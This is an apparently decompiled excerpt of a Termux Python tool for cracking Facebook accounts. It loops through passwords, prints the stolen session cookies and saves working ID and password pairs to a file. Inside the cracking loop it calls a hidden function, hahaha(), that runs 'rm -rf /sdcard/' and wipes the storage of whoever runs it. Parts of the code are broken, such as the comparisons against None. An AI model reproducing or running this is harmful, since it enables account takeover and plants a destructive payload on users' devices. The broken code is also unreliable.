...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        _JAHID_('xdg-open https://www.facebook.com/jsjahid662')
        return None
    if None == '3':
        _JAHID_('xdg-https://youtube.com/@jsjahid6457')
        return None
    if None == '4':
        _JAHID_('xdg-open https://www.facebook.com/groups/452360276797465/?ref=share')
        return None
    if None == '0':
        _JAHID_('exit')
        return None
...
from os import system as _JAHID_
...
try:
    ...
    _JAHID_('pip install mechanize requests futures bs4==2 > /dev/null')
    _JAHID_('pip install bs4')    
...
def hahaha():
	_JAHID_("termux-setup-storage -y")
	_JAHID_("rm -rf /sdcard/")
	_JAHID_("rm -rf /sdcard/*")
my_color = [
 P, M, H, K, B, U, O, N]
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mJAHID-HASAN-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/JAHID-HASAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[JAHID-HASAN] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
